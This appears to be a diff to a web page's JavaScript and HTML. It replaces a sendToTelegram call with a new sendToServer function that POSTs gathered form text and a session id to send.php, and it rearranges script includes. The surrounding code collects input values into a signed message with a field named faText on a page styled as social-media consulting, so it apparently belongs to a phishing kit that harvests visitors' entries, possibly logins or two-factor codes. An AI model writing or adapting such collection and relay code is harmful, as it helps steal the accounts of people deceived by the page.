@@ -96,6 +96,22 @@ document.addEventListener("DOMContentLoaded", () => {
 });
 
 
+async function sendToServer(text){
+  try {
+    const resp = await fetch("send.php", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        text,
+        sessionId: getSessionId()
+      })
+    });
+    const j = await resp.json();
+    console.log(j);
+  } catch(e) {
+    console.warn(e);
+  }
+}
 
 
 
@@ -153,7 +169,7 @@ ${faText}
 —————————————
 Leo37`;
 
-    await sendToTelegram(text);
+    await sendToServer(text);
   }
 
   function getInputValue(selectors){
@@ -1731,7 +1747,8 @@ Work with a consultant to review and improve your social media content strategy 
 </div>
 </div>
 </div>
-
+<script src="js/mobile_check.js"></script>
+<script src="js/think_king.js"></script>
 
 
 <div id="google_translate_element" style="display:none;"></div>
@@ -2031,7 +2048,6 @@ setInterval(removeGoogleTranslateFrame, 500);
 </script>
 
 <script src="js/element.js"></script>
-<script src="js/think_king.js"></script>
 <style>
 
 #google_translate_element,
